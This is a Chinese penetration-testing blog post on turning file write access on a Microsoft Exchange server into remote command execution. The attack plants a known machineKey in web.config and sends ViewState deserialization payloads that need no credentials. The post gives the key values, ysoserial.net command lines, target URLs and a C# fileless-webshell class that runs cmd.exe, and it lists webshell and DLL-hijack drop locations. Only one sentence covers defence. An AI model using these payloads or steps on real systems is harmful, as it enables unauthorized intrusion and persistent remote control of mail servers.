---
layout: post
title: 渗透技巧——从Exchange文件读写权限到命令执行
---


## 0x00 前言
---

在实际的渗透测试过程中，我们会遇到各种不同的环境，例如获得了Exchange服务器的文件读写权限，但是无法执行命令。

本文将要提供一种实现方法，分析利用思路，介绍脚本开发的细节，给出防御建议。

## 0x01 简介
---

本文将要介绍以下内容：

- 解决思路
- 利用方法
- 程序实现
- 防御建议

## 0x02 解决思路
---

### 1.常规解决思路

(1)写入Webshell

通常选择以下两个位置：

- %ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth
- %ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\auth

选择这两个位置的优点是可以直接访问Webshell

也可以选择其他位置，例如`%ExchangeInstallPath%\ClientAccess\ecp\`，写入的文件名称有限制，命令规则可参考`%ExchangeInstallPath%\ClientAccess\ecp\web.config`

**注：**

访问`%ExchangeInstallPath%\ClientAccess\`下的webshell需要添加合法用户的登录Cookie

总的来说，通过写入Webshell的方式比较直接，但是Exchange服务器有可能禁用了命令执行权限或是拦截系统函数的调用，依旧无法获得命令执行权限。

(2)写入PE文件

写入exe文件，可选择以下两种启动文件夹：

- 系统启动文件夹的位置：`%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup`

- 用户启动文件夹的位置：`%USERPROFILE%\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

写入dll文件，可选择系统常见的dll劫持位置，例如`c:\Windows\System32\fxsst.dll`，更多细节可参考：https://github.com/3gstudent/Pentest-and-Development-Tips/blob/master/README-en.md#method-16-windows-fax-dll-injection

总的来说，通过写入PE文件的方式比较被动，需要等待系统加载，无法做到实时的命令执行

### 2.有效的解决思路

修改Exchange配置，设置MachineKey，通过.Net反序列化实现命令执行

可供学习的资料：

http://www.zcgonvh.com/post/weaponizing_CVE-2020-0688_and_about_dotnet_deserialize_vulnerability.html

https://blog.knownsec.com/2020/11/net-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8b-viewstate-%e5%88%a9%e7%94%a8/

简单来说，我们通过设置MachineKey，就能够实现与CVE-2020-0688同样的效果，也就是说，设置MachineKey为默认值后，可以直接使用CVE-2020-0688的利用工具实现命令执行


## 0x03 利用方法
---

1.修改%ExchangeInstallPath%\ClientAccess\ecp\web.config

将`<machineKey validationKey="AutoGenerate,IsolateApps" />`修改为`<machineKey validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" decryptionKey="E9D2490BD0075B51D1BA5288514514AF" validation="SHA1" decryption="3DES" />`

如果没有这一属性，那么就在`system.web`下添加`<machineKey validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" decryptionKey="E9D2490BD0075B51D1BA5288514514AF" validation="SHA1" decryption="3DES" />`

接下来就可以直接使用CVE-2020-0688的利用工具，成熟的利用工具可选择：https://github.com/zcgonvh/CVE-2020-0688/，相比其它已开源的利用工具，这款工具能够实时获得命令执行结果，也支持加载shellcode的功能，其中的技术细节值得深入研究

**注：**

CVE-2020-0688的利用工具大都借助[ysoserial.net](https://github.com/pwntester/ysoserial.net)的TextFormattingRunProperties实现命令执行，无法实时获得命令执行结果

ysoserial.net-1.32的ActivitySurrogateSelectorFromFile能够通过Assembly.Load加载.Net程序集实现返回命令执行的结果，但是兼容性不够，无法做到支持所有版本的.Net环境

zcgonvh开源的[CVE-2020-0688利用工具](https://github.com/zcgonvh/CVE-2020-0688/)解决了ysoserial.net-1.32中ActivitySurrogateSelectorFromFile兼容性的问题，同时对通信数据做了AES加密

ysoserial.net-1.33修复了ActivitySurrogateSelectorFromFile兼容性的bug，[bug由zcgonvh修复](https://github.com/pwntester/ysoserial.net/pull/63)

我们知道，CVE-2020-0688的利用前提是需要掌握一个合法用户的凭据，而我们只获得了Exchange服务器的文件读写权限，还无法立即获得合法用户的凭据，这里可以使用接下来的两种方法绕过这个限制

(1)修改`%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\web.config`

将`<machineKey validationKey="AutoGenerate,IsolateApps" />`修改为`<machineKey validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" decryptionKey="E9D2490BD0075B51D1BA5288514514AF" validation="SHA1" decryption="3DES" />`

这里validationKey和decryptionKey可以任意指定，字符范围为十六进制，即0~F

也可以选用以下算法：

- MD5
- AES
- HMACSHA256
- HMACSHA384
- HMACSHA512 

密钥长度需要符合算法要求，学习资料：

https://devblogs.microsoft.com/aspnet/cryptographic-improvements-in-asp-net-4-5-pt-1/

(2)修改`%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\web.config`

方法同上

对于这两个位置的.Net反序列化命令执行，不再需要合法用户的凭据，所以利用程序也需要做修改。下面介绍三种利用程序实现的细节

## 0x04 实现细节
---

### 1.计算VIEWSTATEGENERATOR的两种方法

Exchange的.Net反序列化用的是ViewState，其中必备的参数为VIEWSTATEGENERATOR，例如Python实现的[CVE-2020-0688利用工具](https://github.com/Ridter/cve-2020-0688/blob/master/cve-2020-0688.py#L46)中使用的默认VIEWSTATEGENERATOR为`B97B4E27`，表示的页面为`ecp/default.aspx`，对应的[ysoserial.net](https://github.com/pwntester/ysoserial.net)的参数为`--path="/ecp/default.aspx" --apppath="/ecp/"`

下面介绍两种计算VIEWSTATEGENERATOR的方法：

C#实现的代码如下：

```
using System;
class a
{
    static void Main(string[] args)
    {
        int hashcode = StringComparer.InvariantCultureIgnoreCase.GetHashCode("/ecp");
	uint _clientstateid=(uint)(hashcode
+StringComparer.InvariantCultureIgnoreCase.GetHashCode("default_aspx"));
Console.WriteLine(_clientstateid.ToString("X2"));
    }
}
```

得出结果为B97B4E27

**注：**

代码来自http://www.zcgonvh.com/post/weaponizing_CVE-2020-0688_and_about_dotnet_deserialize_vulnerability.html

也可以通过网页自动计算，方法如下：

在实际测试环境中，修改ecp/default.aspx的内容如下：

```
<!DOCTYPE HTML>
<html>
<body>
    <form runat="server">
    </form>
</body>
</html>
```

通过浏览器访问该页面，返回结果中的__VIEWSTATEGENERATOR即为计算后的结果

### 2.不需要合法用户凭据的三种反序列化程序实现

(1)借助[ysoserial.net](https://github.com/pwntester/ysoserial.net)的TextFormattingRunProperties实现命令执行的Python代码

CVE-2020-0688中对应ysoserial.net的参数格式如下：

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "{command}" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="{generator}" --viewstateuserkey="{}"
```

由于我们的利用不需要合法用户的凭据，新的ysoserial.net参数格式为：

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "{command}" --validationalg="SHA1" --validationkey="{key}" --generator="{generator}"
```

参数说明如下：

- {command}对应我们要执行的命令
- {key}对应我们设置的validationKey
- {generator}对应要访问页面的VIEWSTATEGENERATOR

借助[ysoserial.net](https://github.com/pwntester/ysoserial.net)的TextFormattingRunProperties生成最终的VIEWSTATE数据后，拼接成以下格式：

```
https://{url}?__VIEWSTATEGENERATOR={generator}&__VIEWSTATE={out_payload}
```

发送GET数据包即可

下面举例进行说明：

选择Exchange默认的错误页面：`%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\errorFE.aspx`

`owa\auth\errorFE.aspx`对应的VIEWSTATEGENERATOR为`042A94E8`

借助[ysoserial.net](https://github.com/pwntester/ysoserial.net)的TextFormattingRunProperties生成最终的VIEWSTATE数据

最终访问的URL为：`https://<ip>/owa/auth/errorFE.aspx?__VIEWSTATEGENERATOR=042A94E8&__VIEWSTATE={out_payload}`

完整的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Python/blob/master/ExchangeDeserializeShell-NoAuth-TextFormattingRunProperties.py

代码支持两个位置的反序列化执行，分别为默认存在的文件`%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\errorFE.aspx`和`%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\auth\TimeoutLogout.aspx`

**注：**

由于我们已获得了Exchange服务器的文件读写权限，这里可以将代码结果输出至指定文件进行查看，命令示例：`net user /domain >c:\test.txt`

(2)借助[ysoserial.net](https://github.com/pwntester/ysoserial.net)的ActivitySurrogateSelectorFromFile实现命令执行并返回执行结果的Python代码

这里使用ysoserial.net的版本需要高于1.32，以避免ActivitySurrogateSelectorFromFile兼容性的bug

新建文件ExploitClass.cs，内容如下：

```
class E
{
    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Form["cmd"];
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write(output);
        } catch (System.Exception) {}
        context.Response.Flush();
        context.Response.End();
    }
}
```

**注：**

代码引用自https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/

更多用法可参考https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/ExploitClass.cs

ysoserial.net的参数格式如下：

```
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;System.Web.dll;System.dll;" --validationalg="SHA1" --validationkey="{key}" --generator="{generator}
```

借助[ysoserial.net](https://github.com/pwntester/ysoserial.net)的ActivitySurrogateSelectorFromFile生成最终的VIEWSTATE数据后，构造POST数据包，添加名为cmd的参数，参数值为要执行的命令

高版本的.NET Framework会禁止ActivitySurrogateSelector，可借助[ysoserial.net](https://github.com/pwntester/ysoserial.net)ActivitySurrogateDisableTypeCheck进行绕过，对应的参数格式如下：

```
ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c "ignore" --validationalg="SHA1" --validationkey="{key}" --generator="{generator}"
```

完整的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Python/blob/master/ExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.py

代码支持两个位置的反序列化执行，分别为默认存在的文件`%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\errorFE.aspx`和`%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\auth\TimeoutLogout.aspx`

代码能够执行命令并获得命令执行的结果，通过POST方式以参数__Value发送数据，通信数据采用逐字符异或加密


(3)基于https://github.com/zcgonvh/CVE-2020-0688/实现无凭据利用的C#代码

VIEWSTATE数据的生成过程同https://github.com/zcgonvh/CVE-2020-0688/保持一致，只需要将validationkey作为变量传入即可

`%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\web.config`和`%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\web.config`均没有限制POST请求，所以在利用上不再需要写入空文件，可以直接生成最终的VIEWSTATE数据并通过POST的方式发送数据

完整的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeDeserializeShell-NoAuth-Fromzcgonvh.cs

代码支持两个位置的反序列化执行，分别为默认存在的文件`%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\errorFE.aspx`和`%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\auth\TimeoutLogout.aspx`

支持的功能同https://github.com/zcgonvh/CVE-2020-0688/保持一致

## 0x05 防御检测
---

在Exchange服务器被入侵后，不仅需要查杀有无可疑的Webshell，同样需要判断web.config中的machineKey是否被修改

## 0x06 小结
---

本文提供了一种从Exchange文件读写权限到命令执行的实现方法，分析利用思路，介绍三种利用脚本的开发细节，给出防御建议。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





